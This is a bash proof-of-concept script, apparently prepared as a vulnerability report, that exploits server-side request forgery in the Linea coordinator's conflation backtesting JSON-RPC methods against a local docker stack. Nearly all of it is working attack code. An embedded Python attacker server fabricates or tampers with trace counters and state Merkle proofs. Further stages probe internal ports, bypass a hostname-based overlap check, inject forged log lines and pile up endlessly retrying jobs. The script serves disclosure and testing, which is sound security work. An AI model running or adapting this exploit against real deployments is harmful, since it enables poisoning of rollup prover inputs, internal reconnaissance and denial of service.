#!/bin/bash
# ==============================================================================
# LINEA COORDINATOR - END-TO-END SSRF IMPACT PoC
# ==============================================================================
# Component : coordinator JSON-RPC API (conflation backtesting methods)
# Methods   : conflation_createProverRequests / conflation_getReconflationJobsStatus
#
# THREAT MODEL:
#   Attacker KNOWS   : the coordinator JSON-RPC URL (network reachability)
#                      + the public open-source repository (compose files,
#                      config samples, RPC method names, response schemas)
#   Attacker UNKNOWN : deployment internals (IPs, logs, filesystem)
#   The attack stages use ONLY the RPC URL and the attacker's own server.
#   The attacker does NOT need the real Shomei address: shomeiApi.endpoint
#   is attacker-supplied - the Coordinator asks the ATTACKER for the proof.
#
# STAGES:
#   [0] Harness setup (analyst stands in for attacker's known RPC URL)
#   [1] BEFORE  (defender snapshot of normal operation)
#   [2] ATTACK  (attacker view - RPC-only):
#        A1  blind SSRF confirmation + protocol capture
#        A2  internal reachability / port-scan oracle
#        A3  live-endpoint overlap check bypass (hostname vs IP)
#        A4  data poisoning - silent corruption (counters +1000)
#        A5  data poisoning - decision control (counters = 999999999)
#        A6  black-box full pipeline ride (all upstreams fabricated)
#        A7  log forging (CWE-117) with run-scoped marker
#        A8  persistent SSRF / resource exhaustion (verified submissions)
#   [3] AFTER   (defender snapshot + before/after impact table)
#   [4] VERDICT (final impact summary, computed from evidence)
#
# CONFIGURABLE ENVIRONMENT VARIABLES (all with sane defaults):
#   OOB_PORT    - attacker OOB/MITM server port           (default: 12345)
#   BH_PORT     - blackhole oracle port, must be closed    (default: 9999)
#   A3_HOSTNAME - live-endpoint string for overlap-check test
#                 (default: http://l2-node-besu:8545/ - from public repo)
#
# Prerequisites: docker environment with linea stack running, coordinator
# healthy, L2 blocks being produced (chain head > 5), python3 available.
# Duration: approximately 8 minutes.
#
# Usage:
#   docker restart coordinator && sleep 60
#   rm -rf tmp/local/conflation-backtesting/*
#   ./poc.sh
#   (or with custom ports: OOB_PORT=23456 BH_PORT=9998 ./poc.sh)
# ==============================================================================
set -u

# --- configurable parameters (all used; override via env) ---
OOB_PORT="${OOB_PORT:-12345}"
BH_PORT="${BH_PORT:-9999}"
A3_HOSTNAME="${A3_HOSTNAME:-http://l2-node-besu:8545/}"

# --- output ---
OUT="poc_results.txt"
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1

# --- run-scoped markers (prevent cross-run contamination) ---
RUN_TS=$(date +%s)
SPOOF_MARK="SPOOF${RUN_TS}"
echo "######################################################################"
echo "#  LINEA COORDINATOR SSRF - END-TO-END IMPACT PoC"
echo "#  started: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "#  run marker: $SPOOF_MARK"
echo "#  config: OOB_PORT=$OOB_PORT BH_PORT=$BH_PORT"
echo "######################################################################"

# =============================================================================
# [0] HARNESS SETUP
# =============================================================================
echo ""
echo "=== [0] HARNESS SETUP ==============================================="

# kill orphan listeners BEFORE spawning new ones (uses configured port)
fuser -k ${OOB_PORT}/tcp 2>/dev/null
sleep 1

# --- verify BH_PORT is actually closed (auto-increment if not) ---
BH_RETRIES=0
while [ $BH_RETRIES -lt 5 ]; do
  if curl -s --connect-timeout 2 "http://127.0.0.1:$BH_PORT/" >/dev/null 2>&1 \
     || fuser $BH_PORT/tcp >/dev/null 2>&1; then
    echo "[!] BH_PORT $BH_PORT appears OPEN on host - incrementing"
    BH_PORT=$((BH_PORT+1)); BH_RETRIES=$((BH_RETRIES+1))
  else
    break
  fi
done
echo "[+] blackhole oracle port: $BH_PORT (closed)"

# --- find coordinator container ---
C=$(docker ps --format '{{.Names}}' | grep -iE coordinator | head -n1)
if [ -z "$C" ]; then
  echo "[-] coordinator container not found"
  docker ps --format '{{.Names}}\t{{.Status}}' | head -15
  exit 1
fi
echo "[+] Coordinator container: $C"

# --- health check (fixed: reject 'unhealthy' explicitly) ---
STATUS=$(docker ps --filter name="$C" --format '{{.Status}}' | head -n1)
echo "[+] Container status: $STATUS"
if echo "$STATUS" | grep -q "unhealthy"; then
  echo "[*] docker healthcheck reports unhealthy (separate probe, not the JSON-RPC API);"
  echo "    relying on RPC reachability + batch production as authoritative signals."
fi
if ! echo "$STATUS" | grep -q "healthy"; then
  echo "[*] No docker healthcheck reported (status: $STATUS) - continuing with RPC probe"
fi

# --- find RPC port and IP ---
P=$(docker logs "$C" 2>&1 | grep -oiE 'JSON-RPC server started port=[0-9]+' | tail -n1 | grep -oE '[0-9]+$')
P=${P:-9546}
IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' "$C" | awk '{print $1}')
GW=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}} {{end}}' "$C" | awk '{print $1}')
RPC="http://$IP:$P/"
DATA=$(docker inspect -f '{{range .Mounts}}{{if eq .Destination "/data"}}{{.Source}}{{end}}{{end}}' "$C")

# --- verify RPC reachable ---
PING=$(curl -s --connect-timeout 5 --max-time 5 -X POST "$RPC" -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":1}' 2>/dev/null)
if ! echo "$PING" | grep -q '"jsonrpc"'; then
  echo "[-] RPC not reachable at $RPC"
  docker logs "$C" --since 2m 2>&1 | grep -viE "RatioSum|fee history" | tail -10
  exit 1
fi
echo "[+] RPC reachable: $RPC"

# --- pipeline liveness: batches being produced (needed by A4/A5) ---
BATCHES_3M=$(docker logs "$C" --since 3m 2>&1 | grep -c "new batch" || true)
if [ "${BATCHES_3M:-0}" -eq 0 ]; then
  echo "[!] no new batches in the last 3 minutes - conflation pipeline may be"
  echo "    stalled or chain idle; A4/A5 (poisoning evidence) require live"
  echo "    batch production. Consider waiting or restarting the stack."
  echo "    (continuing - A1/A2/A3/A6/A7/A8 remain valid regardless)"
else
  echo "[+] batch production alive: ${BATCHES_3M} batches in last 3m"
fi


# --- discover traces upstream (real node; attacker learns via scan oracle) ---
TRACES_UP=""
for c in $(docker ps --format '{{.Names}}' | grep -v "^$C$"); do
  bip=$(docker inspect -f '{{range $k,$v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" 2>/dev/null | awk '{print $1}')
  [ -z "$bip" ] && continue
  r=$(curl -s -m 2 -X POST "http://$bip:8545" -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":1}],"id":1}' 2>/dev/null)
  if echo "$r" | grep -q tracesCounters; then
    TRACES_UP="http://$bip:8545"
    break
  fi
done
if [ -z "$TRACES_UP" ]; then
  echo "[-] traces upstream not found - environment not fully up"
  exit 1
fi
echo "[+] Traces upstream: $TRACES_UP"

# --- chain head and block range ---
HEAD=0
for i in 1 2 3; do
  HX=$(curl -s -m 5 -X POST "$TRACES_UP" -H 'Content-Type: application/json' \
       -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
  [ -n "$HX" ] && { HEAD=$((HX)); break; }
  sleep 5
done
if [ "$HEAD" -lt 5 ]; then
  echo "[-] chain idle (head=$HEAD) - wait for L2 blocks to be produced, then re-run"
  exit 1
fi
START=$((HEAD-3)); END=$((START+1))
mkdir -p "$DATA/conflation-backtesting" 2>/dev/null
echo "[+] Chain head: $HEAD | Block range: $START..$END"
echo "[+] Host data dir: $DATA"

# --- helper functions ---
rpc() { curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "$1"; }
jobid() { echo "$1" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1; }
jobstatus() { rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_getReconflationJobsStatus\",\"params\":[\"$1\"],\"id\":1}"; }
refresh_range() {
  local hx
  hx=$(curl -s -m 5 -X POST "$TRACES_UP" -H 'Content-Type: application/json' \
       -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
  if [ -n "$hx" ] && [ $((hx)) -gt 5 ]; then
    START=$((hx-3)); END=$((START+1))
  fi
}
# verified submit: retries with fresh range if rejected
submit_v() { # $1=traces endpoint, $2=shomei endpoint, $3=label
  local tr="$1" sh="$2" lbl="$3" tries=0 j
  while [ $tries -lt 3 ]; do
    R=$(rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
      \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
      \"tracesApi\":{\"endpoint\":\"$tr\",\"requestLimitPerEndpoint\":100},
      \"shomeiApi\":{\"endpoint\":\"$sh\",\"requestLimitPerEndpoint\":100}}]}")
    j=$(jobid "$R")
    if [ -n "$j" ]; then
      echo "  [$lbl] job accepted: $j"
      return 0
    fi
    echo "  [$lbl] rejected: $(echo "$R" | head -c 120) - refreshing range..."
    refresh_range; tries=$((tries+1)); sleep 3
  done
  echo "  [$lbl] FAILED after 3 attempts"
  return 1
}
# raw submit without retry (for A3 comparison)
submit_raw() { # $1=traces endpoint, $2=shomei endpoint, $3=id
  rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":$3,
    \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
    \"tracesApi\":{\"endpoint\":\"$1\",\"requestLimitPerEndpoint\":100},
    \"shomeiApi\":{\"endpoint\":\"$2\",\"requestLimitPerEndpoint\":100}}]}"
}

# --- attacker-controlled server (port via env) ---
OOB_LOG=/tmp/poc_oob.log
OOB_CTR=/tmp/poc_oob_counter
SRV_LOG=/tmp/poc_server_stderr.log
rm -f "$OOB_LOG" "$OOB_CTR" "$SRV_LOG"
: > "$OOB_LOG"; echo 0 > "$OOB_CTR"
export OOB_LOG OOB_CTR TRACES_UP OOB_PORT

python3 - <<'PYEOF' > "$SRV_LOG" 2>&1 &
import http.server, json, os, urllib.request
LOG=os.environ["OOB_LOG"]; CTRF=os.environ["OOB_CTR"]; UP=os.environ["TRACES_UP"]
PORT=int(os.environ.get("OOB_PORT","12345"))

KEYS=["ADD","BLAKE_MODEXP_DATA","BLOCK_DATA","BLOCK_HASH","BLS_DATA","EC_DATA","EUC","EXP","EXT","GAS",
"HUB","LOG_DATA","LOG_INFO","MMIO","MMU","MOD","MUL","MXP","OOB","RLP_ADDR","RLP_AUTH","RLP_TXN",
"RLP_TXN_RCPT","RLP_UTILS","ROM","ROM_LEX","SHAKIRA_DATA","SHF","STP","TRM","TXN_DATA","WCP",
"PRECOMPILE_ECRECOVER_EFFECTIVE_CALLS","PRECOMPILE_SHA2_BLOCKS","PRECOMPILE_RIPEMD_BLOCKS",
"PRECOMPILE_MODEXP_EFFECTIVE_CALLS","PRECOMPILE_LARGE_MODEXP_EFFECTIVE_CALLS","PRECOMPILE_ECADD_EFFECTIVE_CALLS",
"PRECOMPILE_ECMUL_EFFECTIVE_CALLS","PRECOMPILE_ECPAIRING_FINAL_EXPONENTIATIONS",
"PRECOMPILE_ECPAIRING_G2_MEMBERSHIP_CALLS","PRECOMPILE_ECPAIRING_MILLER_LOOPS",
"PRECOMPILE_BLAKE_EFFECTIVE_CALLS","PRECOMPILE_BLAKE_ROUNDS",
"PRECOMPILE_BLS_POINT_EVALUATION_EFFECTIVE_CALLS","PRECOMPILE_POINT_EVALUATION_FAILURE_EFFECTIVE_CALLS",
"PRECOMPILE_BLS_G1_ADD_EFFECTIVE_CALLS","PRECOMPILE_BLS_G1_MSM_EFFECTIVE_CALLS",
"PRECOMPILE_BLS_G2_ADD_EFFECTIVE_CALLS","PRECOMPILE_BLS_G2_MSM_EFFECTIVE_CALLS",
"PRECOMPILE_BLS_PAIRING_CHECK_MILLER_LOOPS","PRECOMPILE_BLS_FINAL_EXPONENTIATIONS",
"PRECOMPILE_BLS_MAP_FP_TO_G1_EFFECTIVE_CALLS","PRECOMPILE_BLS_MAP_FP2_TO_G2_EFFECTIVE_CALLS",
"PRECOMPILE_BLS_C1_MEMBERSHIP_CALLS","PRECOMPILE_BLS_C2_MEMBERSHIP_CALLS",
"PRECOMPILE_BLS_G1_MEMBERSHIP_CALLS","PRECOMPILE_BLS_G2_MEMBERSHIP_CALLS",
"PRECOMPILE_P256_VERIFY_EFFECTIVE_CALLS","BLOCK_KECCAK","BLOCK_L1_SIZE","BLOCK_L2_L1_LOGS","BLOCK_TRANSACTIONS"]

def fwd(body):
    try:
        req=urllib.request.Request(UP,data=body,headers={"Content-Type":"application/json"},method="POST")
        with urllib.request.urlopen(req,timeout=180) as r: return r.read()
    except Exception: return None

def bump():
    try:
        with open(CTRF) as f: n=int(f.read().strip() or 0)
        with open(CTRF,"w") as f: f.write(str(n+1))
    except Exception: pass

class H(http.server.BaseHTTPRequestHandler):
    def reply(self,obj):
        r=json.dumps(obj).encode()
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(r)))
        self.end_headers()
        self.wfile.write(r)

    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0)
        body=self.rfile.read(n)
        bump()
        try:
            req=json.loads(body)
            m=req.get("method","")
            rid=req.get("id",1)
        except Exception:
            m,rid="",1
        note=""
        if m=="linea_getBlockTracesCountersV2":
            if self.path.endswith("/fab"):
                obj={"jsonrpc":"2.0","id":rid,"result":{
                    "tracesEngineVersion":"attacker-fab",
                    "blockNumber":(req.get("params") or [{}])[0].get("blockNumber",0),
                    "tracesCounters":{k:5 for k in KEYS}}}
                note="FABRICATED counters"
            elif self.path.endswith("/tap"):
                raw=fwd(body)
                obj=json.loads(raw) if raw else {"jsonrpc":"2.0","id":rid,"error":{"code":-32000,"message":"no upstream"}}
                if raw:
                    t=(obj.get("result") or {}).get("tracesCounters")
                    if isinstance(t,dict):
                        for k in list(t.keys()):
                            if isinstance(t[k],int): t[k]=t[k]+1000
                        note="TAMPERED +1000"
            elif self.path.endswith("/tapover"):
                raw=fwd(body)
                obj=json.loads(raw) if raw else {"jsonrpc":"2.0","id":rid,"error":{"code":-32000,"message":"no upstream"}}
                if raw:
                    t=(obj.get("result") or {}).get("tracesCounters")
                    if isinstance(t,dict):
                        for k in list(t.keys()):
                            if isinstance(t[k],int): t[k]=999999999
                        note="TAMPERED =999999999"
            else:
                obj={"jsonrpc":"2.0","id":rid,"result":{}}
                note="recon capture"
        elif m=="linea_generateConflatedTracesToFileV2":
            if self.path.endswith("/fab"):
                obj={"jsonrpc":"2.0","id":rid,"result":{
                    "tracesEngineVersion":"attacker-fab",
                    "conflatedTracesFileName":"/data/traces/v2/conflated/ATTACKER-FABRICATED.lt.gz"}}
                note="FABRICATED traces path+version"
            else:
                raw=fwd(body)
                obj=json.loads(raw) if raw else {"jsonrpc":"2.0","id":rid,"result":{}}
                note="passthrough"
        elif m=="rollup_getZkEVMStateMerkleProofV0":
            obj={"jsonrpc":"2.0","id":rid,"result":{
                "zkParentStateRootHash":"0x"+"00"*31+"ff",
                "zkStateMerkleProof":{
                    "finalStateRootHash":"0x"+"00"*31+"ee",
                    "unfinalizedStateRootHash":"0x"+"00"*31+"dd",
                    "nodeCount":0},
                "zkStateManagerVersion":"attacker-1"}}
            note="COORDINATOR ASKS ATTACKER FOR STATE MERKLE PROOF"
        else:
            obj={"jsonrpc":"2.0","id":rid,"result":{}}
        try:
            with open(LOG,"a") as f:
                f.write("CALL %-40s %s\n  req : %s\n  resp: %s\n" % (
                    m,note,body.decode(errors='replace')[:200],json.dumps(obj)[:220]))
        except Exception: pass
        self.reply(obj)

    def log_message(self,*a): pass

http.server.ThreadingHTTPServer(("0.0.0.0",PORT),H).serve_forever()
PYEOF

SRV_PID=$!
sleep 1
if ! kill -0 $SRV_PID 2>/dev/null; then
  echo "[-] attacker server failed to start:"
  cat "$SRV_LOG" | head -10
  exit 1
fi
oob_total() { cat "$OOB_CTR" 2>/dev/null || echo 0; }
ATTACKER="http://$GW:$OOB_PORT"          # single source of truth for attacker URL
echo "[+] Attacker server up (pid $SRV_PID) at $ATTACKER"
echo ""

# =============================================================================
# [1] BEFORE ATTACK - defender snapshot of normal operation
# =============================================================================
echo "=== [1] BEFORE ATTACK (defender view) ==============================="
B_RETRY=$(docker logs "$C" 2>&1 | grep -c "already retried" || true)
B_FORGE=$(docker logs "$C" 2>&1 | grep -c "time=2099-01-01" || true)
B_DUMP=$(docker logs "$C" 2>&1 | grep -c "Conflation backtesting coordinatorConfig=" || true)
B_JOBS=$(ls "$DATA/conflation-backtesting" 2>/dev/null | wc -l)
B_OOB=$(oob_total)
echo "  retry-loop lines   : $B_RETRY"
echo "  forged log lines   : $B_FORGE"
echo "  config-dump lines  : $B_DUMP"
echo "  backtesting jobs   : $B_JOBS"
echo "  OOB calls received : $B_OOB"
echo "  (natural batches for reference:)"
docker logs "$C" --since 3m 2>&1 | grep "new batch" | tail -2 | cut -c1-160 | sed 's/^/    /'

# =============================================================================
# [2] ATTACK - attacker view: ONLY the RPC URL + own server
# =============================================================================
echo ""
echo "=== [2] ATTACK (attacker view - RPC only) ==========================="

# ---- A1: Blind SSRF confirmation + protocol capture ----
echo "--- [A1] Blind SSRF + protocol capture ------------------------------"
submit_v "$ATTACKER/recon" "$ATTACKER/recon" "A1" || exit 1
J1=$(jobid "$R")
echo "  waiting 40s..."
sleep 40
A1_TOTAL=$(oob_total)
A1_RECON=$(grep -c "recon capture" "$OOB_LOG" 2>/dev/null || echo 0)
cp "$OOB_LOG" /tmp/poc_a1_evidence.log
echo "  OOB calls total: $A1_TOTAL | recon captures: $A1_RECON"
echo "  sample captured calls:"
grep '^CALL' "$OOB_LOG" | tail -5 | sed 's/^/    /'

# ---- A2: Internal reachability oracle ----
echo ""
echo "--- [A2] Reachability oracle (blackhole vs reachable) ---------------"
submit_v "http://$GW:$BH_PORT" "$ATTACKER" "A2" || true
J2=$(jobid "$R")
A2_BH_CREATED=1
[ -z "$J2" ] && A2_BH_CREATED=0
for i in 1 2 3; do
  sleep 10
  echo "  blackhole job t=$((i*10))s: $(jobstatus "$J2" 2>/dev/null | grep -oE 'IN_PROGRESS|COMPLETED|ERROR' | head -n1)"
done
A2_REACHABLE=$(grep -c "recon capture" /tmp/poc_a1_evidence.log 2>/dev/null || echo 0)
echo "  >> differential: blackhole target = IN_PROGRESS forever (infinite retry)"
echo "     reachable target (A1) = OOB calls within seconds"

# ---- A3: Overlap check bypass (hostname vs IP) ----
echo ""
echo "--- [A3] Overlap check: hostname rejected vs IP accepted ------------"
R_HOST=$(submit_raw "$A3_HOSTNAME" "$ATTACKER" 3)
echo "  hostname form ($A3_HOSTNAME):"
echo "    -> $(echo "$R_HOST" | head -c 150)"
R_IP=$(submit_raw "$TRACES_UP" "$ATTACKER" 4)
echo "  IP form ($TRACES_UP):"
echo "    -> $(echo "$R_IP" | head -c 150)"
A3_HOST_REJECTED=0; A3_IP_ACCEPTED=0
echo "$R_HOST" | grep -q '"error"' && A3_HOST_REJECTED=1
echo "$R_IP" | grep -q '"result"' && A3_IP_ACCEPTED=1
if [ "$A3_HOST_REJECTED" = 1 ] && [ "$A3_IP_ACCEPTED" = 1 ]; then
  echo "  >> CONFIRMED: overlap check is string-based (hostname rejected, IP of same service accepted)"
elif [ "$A3_IP_ACCEPTED" = 1 ]; then
  echo "  >> OBSERVED: IP form accepted (hostname form: see above)"
else
  echo "  >> NOTE: both forms show same behavior - document observed responses"
fi

# ---- A4: Data poisoning (silent corruption, +1000) ----
echo ""
echo "--- [A4] Data poisoning: silent corruption (counters +1000) ---------"
submit_v "$ATTACKER/tap" "$ATTACKER/tap" "A4" || true
J4=$(jobid "$R")
A4_FOUND=0
for i in $(seq 1 12); do
  sleep 10
  PB=$(docker logs "$C" --since 5m 2>&1 | grep "new batch" | grep -c "ADD=1000" || true)
  if [ "${PB:-0}" -ge 1 ]; then
    echo "  [+] poisoned batch detected at t=$((i*10))s"
    A4_FOUND=1; break
  fi
  if [ $((i % 3)) = 0 ]; then
    echo "  t=$((i*10))s status=$(jobstatus "$J4" 2>/dev/null | grep -oE 'IN_PROGRESS|COMPLETED' | head -n1) pb=${PB:-0}"
  fi
done
[ "$A4_FOUND" = 0 ] && echo "  [-] not detected in 120s - check AFTER section"

# ---- A5: Data poisoning (decision control, 999999999) ----
echo ""
echo "--- [A5] Data poisoning: decision control (counters = 999999999) ----"
submit_v "$ATTACKER/tapover" "$ATTACKER/tapover" "A5" || true
J5=$(jobid "$R")
A5_FOUND=0
for i in $(seq 1 12); do
  sleep 10
  PB=$(docker logs "$C" --since 5m 2>&1 | grep "new batch" | grep -c "ADD=999999999" || true)
  if [ "${PB:-0}" -ge 1 ]; then
    echo "  [+] forced-limit batch detected at t=$((i*10))s"
    A5_FOUND=1; break
  fi
  if [ $((i % 3)) = 0 ]; then
    echo "  t=$((i*10))s status=$(jobstatus "$J5" 2>/dev/null | grep -oE 'IN_PROGRESS|COMPLETED' | head -n1) fb=${PB:-0}"
  fi
done
[ "$A5_FOUND" = 0 ] && echo "  [-] not detected in 120s - check AFTER section"

# ---- A6: Full fabricated ride ----
echo ""
echo "--- [A6] Black-box full pipeline ride (all upstreams fabricated) ----"
: > "$OOB_LOG"
submit_v "$ATTACKER/fab" "$ATTACKER/fab" "A6" || true
J6=$(jobid "$R")
echo "  waiting 90s for pipeline ride..."
sleep 90
A6_SHOMEI=$(grep -c "STATE MERKLE PROOF" "$OOB_LOG" 2>/dev/null || echo 0)
A6_COUNTERS=$(grep -c "FABRICATED counters" "$OOB_LOG" 2>/dev/null || echo 0)
A6_TRACES=$(grep -c "FABRICATED traces" "$OOB_LOG" 2>/dev/null || echo 0)
echo "  coordinator-to-attacker calls in this stage:"
echo "    rollup_ (state proof from ATTACKER) : $A6_SHOMEI"
echo "    fabricated counters consumed        : $A6_COUNTERS"
echo "    fabricated traces path consumed     : $A6_TRACES"
if [ "${A6_SHOMEI:-0}" -ge 1 ]; then
  echo "  >> COORDINATOR REQUESTED THE STATE MERKLE PROOF FROM THE ATTACKER"
fi

# ---- A7: Log forging (CWE-117) with run-scoped marker ----
echo ""
echo "--- [A7] Log forging (CWE-117) - marker: $SPOOF_MARK --------------"
FORGED="$ATTACKER/x\\ntime=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF_MARK FAKE-LOG-ENTRY-BY-ATTACKER"
R=$(rpc "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":8,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
  \"tracesApi\":{\"endpoint\":\"$FORGED\",\"requestLimitPerEndpoint\":1},
  \"shomeiApi\":{\"endpoint\":\"$ATTACKER\",\"requestLimitPerEndpoint\":1}}]}")
echo "  submit response: $(echo "$R" | head -c 120)"
sleep 15
A7_HIT=$(docker logs "$C" 2>&1 | grep -c "time=2099-01-01.*$SPOOF_MARK" || true)
echo "  forged lines for THIS run marker: $A7_HIT"
if [ "${A7_HIT:-0}" -ge 1 ]; then
  echo "  sample forged entry:"
  docker logs "$C" 2>&1 | grep "time=2099-01-01.*$SPOOF_MARK" | head -n1 | cut -c1-200 | sed 's/^/    /'
fi

# ---- A8: Persistent SSRF / resource exhaustion ----
echo ""
echo "--- [A8] Resource exhaustion (verified blackhole jobs) --------------"
A8_OK=0
for i in 1 2 3 4 5; do
  submit_v "http://$GW:$BH_PORT" "http://$GW:$BH_PORT" "A8.$i" && A8_OK=$((A8_OK+1)) || true
  sleep 2
done
echo "  blackhole jobs accepted: $A8_OK/5"
echo "  waiting 60s for retry accumulation..."
sleep 60

# =============================================================================
# [3] AFTER ATTACK - defender snapshot + before/after impact table
# =============================================================================
echo ""
echo "=== [3] AFTER ATTACK (defender view) ================================="
A_BATCH=$(docker logs "$C" --since 10m 2>&1 | grep "new batch" | grep -cE "ADD=1000|ADD=999999999" || true)
A_RETRY=$(docker logs "$C" 2>&1 | grep -c "already retried" || true)
A_DUMP=$(docker logs "$C" 2>&1 | grep -c "Conflation backtesting coordinatorConfig=" || true)
A_JOBS=$(ls "$DATA/conflation-backtesting" 2>/dev/null | wc -l)
A_OOB=$(oob_total)
echo "  poisoned batches (ADD=1000 or ADD=999999999): $A_BATCH"
docker logs "$C" --since 10m 2>&1 | grep "new batch" | grep -E "ADD=1000|ADD=999999999" | \
  grep -oE "batch=\[[0-9.]+\][0-9]+ trigger=[A-Z_]+" | tail -4 | sed 's/^/    /'
echo ""
echo "  retry evidence:"
docker logs "$C" --since 2m 2>&1 | grep "already retried" | tail -n2 | cut -c1-200 | sed 's/^/    /'
echo ""
echo "  topology disclosure (endpoints from config dumps):"
docker logs "$C" 2>&1 | grep -oE "endpoints=\[[^]]+\]" | sort -u | head -8 | sed 's/^/    /'

echo ""
echo "=== IMPACT TABLE (before -> after) ==================================="
printf "  %-36s %10s %10s\n" "metric" "BEFORE" "AFTER"
printf "  %-36s %10s %10s\n" "poisoned batch lines" "0" "${A_BATCH:-0}"
printf "  %-36s %10s %10s\n" "retry-loop log lines" "$B_RETRY" "$A_RETRY"
printf "  %-36s %10s %10s\n" "forged lines (this run)" "0" "${A7_HIT:-0}"
printf "  %-36s %10s %10s\n" "config-dump lines" "$B_DUMP" "$A_DUMP"
printf "  %-36s %10s %10s\n" "backtesting job dirs" "$B_JOBS" "$A_JOBS"
printf "  %-36s %10s %10s\n" "calls to attacker server" "$B_OOB" "$A_OOB"

# =============================================================================
# [4] FINAL VERDICT
# =============================================================================
echo ""
echo "=== [4] FINAL IMPACT VERDICT ========================================="
echo ""

V_PASS=0; V_TOTAL=0

V_TOTAL=$((V_TOTAL+1))
if [ "${A1_RECON:-0}" -ge 1 ] || [ "${A6_SHOMEI:-0}" -ge 1 ]; then
  echo "[PASS] SSRF: coordinator made server-side POSTs to attacker URL"
  echo "       (A1 recon captures: $A1_RECON | A6 rollup calls: $A6_SHOMEI)"
  V_PASS=$((V_PASS+1))
else
  echo "[FAIL] SSRF not confirmed"
fi

V_TOTAL=$((V_TOTAL+1))
if [ "${A_BATCH:-0}" -ge 1 ]; then
  echo "[PASS] DATA POISONING: attacker counters ingested -> conflation decisions"
  echo "       changed (ADD=1000 / ADD=999999999 with trigger=TRACES_LIMIT)"
  V_PASS=$((V_PASS+1))
else
  echo "[FAIL] poisoning not observed - check A4/A5 stage output"
fi

V_TOTAL=$((V_TOTAL+1))
if [ "${A6_SHOMEI:-0}" -ge 1 ]; then
  echo "[PASS] PROVER-INPUT CONTROL: coordinator requested state Merkle proof"
  echo "       FROM THE ATTACKER ($A6_SHOMEI rollup_ calls)"
  V_PASS=$((V_PASS+1))
else
  echo "[WARN] pipeline ride did not reach shomei stage"
fi

V_TOTAL=$((V_TOTAL+1))
if [ "${A7_HIT:-0}" -ge 1 ]; then
  echo "[PASS] LOG FORGING (CWE-117): $A7_HIT forged entries with marker $SPOOF_MARK"
  V_PASS=$((V_PASS+1))
else
  echo "[FAIL] log forging not observed"
fi

V_TOTAL=$((V_TOTAL+1))
if [ "${A_RETRY:-0}" -gt "$B_RETRY" ]; then
  echo "[PASS] PERSISTENT SSRF/DoS: retry lines $B_RETRY -> $A_RETRY"
  echo "       ($A8_OK/5 blackhole jobs accepted, IN_PROGRESS indefinitely)"
  V_PASS=$((V_PASS+1))
else
  echo "[WARN] retry growth: $B_RETRY -> $A_RETRY"
fi

V_TOTAL=$((V_TOTAL+1))
if [ "${A_DUMP:-0}" -gt "$B_DUMP" ]; then
  echo "[PASS] INFO DISCLOSURE: config dumps $B_DUMP -> $A_DUMP lines"
  echo "       (internal topology: endpoints, signer keys, DB config)"
  V_PASS=$((V_PASS+1))
else
  echo "[WARN] config dump delta: $B_DUMP -> $A_DUMP"
fi

if [ "$A3_HOST_REJECTED" = 1 ] && [ "$A3_IP_ACCEPTED" = 1 ]; then
  echo ""
  echo "[PASS] OVERLAP CHECK BYPASS: hostname rejected but IP of same service accepted"
  echo "       (the only URL control is string-equality based)"
fi

echo ""
echo "=== SCORE: $V_PASS / $V_TOTAL verdicts passed ======================="
echo ""
echo "=== DOCUMENTED BOUNDARIES (source-verified, for triage) ============="
echo "  - No L1 submission from poisoned jobs (no signer, no submission"
echo "    components, in-memory-only persistence)"
echo "  - No file-write primitive (request filenames from block numbers"
echo "    and internal hashes only; attacker strings are JSON body fields)"
echo "  - No RCE vector found (POST-only HTTP, no redirect follow,"
echo "    no response reflection, no scheme abuse)"
echo "  - Cloud metadata credential theft: not viable (tested)"
echo ""

# =============================================================================
# CLEANUP
# =============================================================================
echo "=== ARTIFACTS ========================================================="
echo "  $OUT                       (this output)"
echo "  $OOB_LOG                   (OOB/attacker server log)"
echo "  /tmp/poc_a1_evidence.log   (A1 preserved capture)"
echo "  $SRV_LOG                   (attacker server stderr)"
echo ""

kill $SRV_PID 2>/dev/null
fuser -k ${OOB_PORT}/tcp 2>/dev/null

echo "=== CLEANUP (run after preserving evidence) ==========================="
echo "  docker restart $C"
echo "  rm -rf $DATA/conflation-backtesting/*"
echo ""
echo "######################################################################"
echo "#  PoC finished: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "#  Verdict: $V_PASS/$V_TOTAL passed"
echo "######################################################################"
